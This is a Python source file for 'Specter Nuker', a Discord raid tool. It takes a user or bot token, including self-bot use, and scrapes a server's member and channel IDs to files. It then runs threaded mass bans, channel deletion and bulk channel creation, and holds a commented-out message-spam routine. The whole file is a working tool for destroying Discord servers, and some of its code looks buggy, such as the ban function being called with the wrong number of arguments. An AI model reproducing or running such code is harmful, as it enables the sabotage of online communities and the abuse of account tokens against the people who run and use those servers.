import json
import string
import discord
import os
from discord import client
from discord import integrations
from discord.ext import commands
import os
import time
import requests
import asyncio
from more_itertools import divide
import threading
import colorama
from colorama import Fore
from colorama import init, Fore, Back, Style
from tkinter import *
colorama.init(autoreset=True)

os.system(f'cls & mode 85,20 & title [Specter] BY JW - Configuration')
token=input(Fore.CYAN+"Token:")

prefix="^"

def check_token(token: str) -> str:
    if requests.get("https://discord.com/api/v8/users/@me", headers={"Authorization": token}).status_code == 200:
        return "user"
    else:
        return "bot"

token_type = check_token(token)

if token_type == "user":
    headers = {'Authorization': f'{token}'}
    client = commands.Bot(command_prefix=prefix, case_insensitive=False, self_bot=True,intents = discord.Intents.all())
else:
    headers = {'Authorization': f'Bot {token}'}
    client = commands.Bot(command_prefix=prefix, case_insensitive=False,intents = discord.Intents.all())
    
client.remove_command("help")


def clear():
    os.system("cls||clear")


def gui():
    os.system(f'cls & mode 85,20 & title [Specter Nuker] BY JW - Connected: {client.user}')
    print(Fore.LIGHTRED_EX+"""
       
        ███████╗██████╗ ███████╗ ██████╗████████╗███████╗██████╗ 
        ██╔════╝██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗
        ███████╗██████╔╝█████╗  ██║        ██║   █████╗  ██████╔╝
        ╚════██║██╔═══╝ ██╔══╝  ██║        ██║   ██╔══╝  ██╔══██╗
        ███████║██║     ███████╗╚██████╗   ██║   ███████╗██║  ██║  

        Bot Developed by tb (jw on top)

        [1]-Scrape Info  [2]-Mass Ban [3]-Delete Channels

        [4]-Create Channels
        

    """)


async def menu():
    os.system(f'cls & mode 85,20 & title [Specter Nuker] BY JW - Connected: {client.user}')

    while True:
        clear()
        gui()
        choice=input(Fore.CYAN+"Please Enter Your Choice:")
        if choice=="1":
            await scrape()
        elif choice=="2":
            guild_id = input(f'guild id: ')
            main_members=[]
            num=0
            a_file= open('members.txt','r')

            for line in a_file:
                stripped_line=line.strip()
                main_members.append(stripped_line)
            a_file.close()
            members_1,members_2,members_3=map(list,divide(3,main_members))
            while True:
                threading.Thread(target= ban,args=(members_1[num],)).start()
                threading.Thread(target= ban,args=(members_2[num],)).start()
                threading.Thread(target= ban,args=(members_3[num],)).start()
                num+=1
                

        elif choice=="3":
            main_channels=[]
            cnum=0
            b_file=open('channels.txt','r')

            for line in b_file:
                stripped_line=line.strip()
                main_channels.append(stripped_line)
            b_file.close()

            while True:
                threading.Thread(target=delete_channels,args=(main_channels[cnum],)).start()
                cnum+=1
                
        elif choice=="4":
            channel_names=input("Channel Names: ")
            guild_id=input("Enter Guild ID:")
            number_of_channels=int(input("Number of Channels:"))
            for i in range(number_of_channels):
                threading.Thread(target=mass_channels,args=(guild_id,channel_names,)).start()
                
        """
        elif choice=="5":
            main_channels=[]
            cnum=0
            b_file=open('channels.txt','r')

            for line in b_file:
                stripped_line=line.strip()
                main_channels.append(stripped_line)
            b_file.close()

            message=input("Message: ")
            number_of_messages=int(input("Numer of Messages: "))
            for i in range(number_of_messages):
                threading.Thread(target=spam_messages,args=(main_channels[cnum],message,)).start()
        """



@client.event
async def on_ready():
    os.system('cls||clear')
    await menu()
  
def ban(guild_id, member):
    r = requests.put(f'https://discord.com/api/v8/guilds/{guild_id}/bans/{member}', headers=headers)
                
    if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
        print(Fore.LIGHTWHITE_EX+ f"Banned {member} ")
    else:
        print(Fore.LIGHTWHITE_EX+f" Couldn't Ban {member} ")

    
def delete_channels(channels):
    r=requests.delete(f'https://discord.com/api/v8/channels/{channels}',headers=headers)
    
    if r.status_code ==200 or r.status_code==201 or r.status_code==204:
        print(Fore.LIGHTWHITE_EX+ f'Deletd {channels}')
    else:
        print(Fore.LIGHTWHITE_EX+ f"Couldn't Delete {channels}")
    

def mass_channels(guild_id,name):
    json={'name':name, 'type':0}
    r=requests.post(f'https://discord.com/api/v8/guilds/{guild_id}/channels',headers=headers,json=json)

    if r.status_code ==200 or r.status_code==201 or r.status_code==204:
        print(Fore.LIGHTWHITE_EX+ f'Created Channels {name}')
    else:
        print(Fore.LIGHTWHITE_EX+ f"Couldn't Create Channels")

"""
def spam_messages(channels,message):

    data={'content':message}
    url = 'https://discord.com/api/v8/channels/{}/messages'.format(channels)
    r=requests.post(url,data=data,headers=headers)

    if r.status_code ==200 or r.status_code==201 or r.status_code==204:
        print(Fore.LIGHTWHITE_EX+ f'Send Message {message}')
    else:
        print(Fore.LIGHTWHITE_EX+ f"Couldn't Send Message")
"""
async def scrape(): 
    

    global member_count
    
    try:
        os.remove("members.txt")
        os.remove("channels.txt")
    except:
        pass

    member_count = 0
    guild_id = int(input('Enter Server ID: '))
    await client.wait_until_ready()
    ob = client.get_guild(guild_id)
    members = await ob.chunk()
    f= open('members.txt', 'a')
    for member in members:
        f.write(str(member.id) + "\n")
        member_count += 1

    channel_count=0
    channels=ob.channels
    x= open('channels.txt','a')
    for channel in channels:
        x.write(str(channel.id)+'\n')
        channel_count+=1
    


    print(Fore.LIGHTMAGENTA_EX+f"{member_count} Members")
    print(Fore.LIGHTMAGENTA_EX+f"{channel_count} Channels")

    time.sleep(2)
    


try:
    if token_type == "user":
        client.run(token, bot=False)
    elif token_type == "bot":
        client.run(token)
except:
    print(f'Invalid Token')
    time.sleep(2)
        
